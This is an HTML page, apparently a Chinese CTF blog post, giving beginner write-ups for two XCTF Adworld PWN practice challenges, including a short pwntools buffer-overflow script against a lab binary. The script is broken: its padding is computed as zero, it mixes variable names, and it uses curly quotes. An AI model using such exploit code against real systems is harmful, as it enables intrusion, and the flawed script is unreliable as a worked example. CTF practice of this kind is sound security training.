@@ -1,0 +1,191 @@
+<!DOCTYPE html><html class="hide-aside" lang="zh_Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>攻防世界PWN新手区WP（长期更新） | 【W】</title><meta name="keywords" content="人生苦短，我学Pwn"><meta name="author" content="[&quot;W&quot;]"><meta name="copyright" content="[&quot;W&quot;]"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="攻防世界PWN新手题WP（长期更新） 题目地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;task_list?type&#x3D;pwn&amp;number&#x3D;2&amp;grade&#x3D;0  一、get_shell  获取靶场,nc登上查看即可，   二、Hello pwn!  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。     嗯，只开了NX，好耶！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界PWN新手区WP（长期更新）">
+<meta property="og:url" content="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/index.html">
+<meta property="og:site_name" content="【W】">
+<meta property="og:description" content="攻防世界PWN新手题WP（长期更新） 题目地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;task_list?type&#x3D;pwn&amp;number&#x3D;2&amp;grade&#x3D;0  一、get_shell  获取靶场,nc登上查看即可，   二、Hello pwn!  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。     嗯，只开了NX，好耶！">
+<meta property="og:locale">
+<meta property="og:image" content="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/bg03旧校舎03(夏).bmp">
+<meta property="article:published_time" content="2021-11-17T11:02:54.000Z">
+<meta property="article:modified_time" content="2021-11-17T11:57:55.817Z">
+<meta property="article:author" content="W">
+<meta property="article:tag" content="人生苦短，我学Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/bg03旧校舎03(夏).bmp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '攻防世界PWN新手区WP（长期更新）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-11-17 19:57:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="【W】" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/ev草・郎汎用02c1.bmp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/bg03旧校舎03(夏).bmp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">【W】</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界PWN新手区WP（长期更新）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-11-17T11:02:54.000Z" title="Created 2021-11-17 19:02:54">2021-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-11-17T11:57:55.817Z" title="Updated 2021-11-17 19:57:55">2021-11-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界PWN新手区WP（长期更新）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="攻防世界PWN新手题WP（长期更新）"><a href="#攻防世界PWN新手题WP（长期更新）" class="headerlink" title="攻防世界PWN新手题WP（长期更新）"></a>攻防世界PWN新手题WP（长期更新）</h1><blockquote>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0</a></p>
+</blockquote>
+<h2 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h2><p>  获取靶场,nc登上查看即可，</p>
+<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117192610443.png" alt="image-20211117192610443" style="zoom:33%;">
+
+<h2 id="二、Hello-pwn"><a href="#二、Hello-pwn" class="headerlink" title="二、Hello pwn!"></a>二、Hello pwn!</h2><p>  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。</p>
+<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117193524850.png" alt="image-20211117193524850" style="zoom: 75%;">
+
+<p>  嗯，只开了NX，好耶！</p>
+<p>  接下来用64位的ida打开分析逻辑，如下图</p>
+<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117194019299.png" alt="image-20211117194019299" style="zoom:50%;">
+
+<p>  看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。</p>
+<p>  明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下：</p>
+<blockquote>
+<p>from pwn import  *</p>
+<p>context.arch = “amd64”</p>
+<p>p = remote(‘地址’， 端口)</p>
+<p>payload = b’a’ * ( 0x60106C - 0x60106C ) + p64(1853186401)</p>
+<p>io.sendlineafter(“bof\n”, payload)</p>
+<p>io.interactive()</p>
+</blockquote>
+<p>  运行，皆大欢喜。</p>
+<p>  <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117195744632.png" alt="image-20211117195744632"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">W</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/">https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/">人生苦短，我学Pwn</a></div><div class="post_share"><div class="social-share" data-image="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/bg03旧校舎03(夏).bmp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/10/22/Pwn-%E5%85%A5%E9%97%A8%E6%9C%AD%E8%AE%B0/"><img class="next-cover" src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/im01オープニング12_背景d2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Pwn 入门札记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/ev草・郎汎用02c1.bmp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">W</div><div class="author-info__description">Less intrests , more interest .</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E9%A2%98WP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">攻防世界PWN新手题WP（长期更新）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81get-shell"><span class="toc-number">1.1.</span> <span class="toc-text">一、get_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Hello-pwn"><span class="toc-number">1.2.</span> <span class="toc-text">二、Hello pwn!</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="攻防世界PWN新手区WP（长期更新）"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/bg03旧校舎03(夏).bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界PWN新手区WP（长期更新）"/></a><div class="content"><a class="title" href="/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/" title="攻防世界PWN新手区WP（长期更新）">攻防世界PWN新手区WP（长期更新）</a><time datetime="2021-11-17T11:02:54.000Z" title="Created 2021-11-17 19:02:54">2021-11-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/22/Pwn-%E5%85%A5%E9%97%A8%E6%9C%AD%E8%AE%B0/" title="Pwn 入门札记"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/im01オープニング12_背景d2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn 入门札记"/></a><div class="content"><a class="title" href="/2021/10/22/Pwn-%E5%85%A5%E9%97%A8%E6%9C%AD%E8%AE%B0/" title="Pwn 入门札记">Pwn 入门札记</a><time datetime="2021-10-22T15:20:31.000Z" title="Created 2021-10-22 23:20:31">2021-10-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/" title="linux学习札记"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/overthewire/bg01l久遠寺邸03居間-(夕).bmp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux学习札记"/></a><div class="content"><a class="title" href="/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/" title="linux学习札记">linux学习札记</a><time datetime="2021-10-20T15:35:51.000Z" title="Created 2021-10-20 23:35:51">2021-10-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/" title="攻防世界MISC新手题部分WP(更新ing)"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/jiuyuansi.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻防世界MISC新手题部分WP(更新ing)"/></a><div class="content"><a class="title" href="/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/" title="攻防世界MISC新手题部分WP(更新ing)">攻防世界MISC新手题部分WP(更新ing)</a><time datetime="2021-10-10T00:34:06.000Z" title="Created 2021-10-10 08:34:06">2021-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/09/CTF%E7%AE%80%E4%BB%8B/" title="CTF简介"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/im02l空(昼).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF简介"/></a><div class="content"><a class="title" href="/2021/10/09/CTF%E7%AE%80%E4%BB%8B/" title="CTF简介">CTF简介</a><time datetime="2021-10-09T13:57:31.000Z" title="Created 2021-10-09 21:57:31">2021-10-09</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/bg03旧校舎03(夏).bmp')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By W</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">简</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
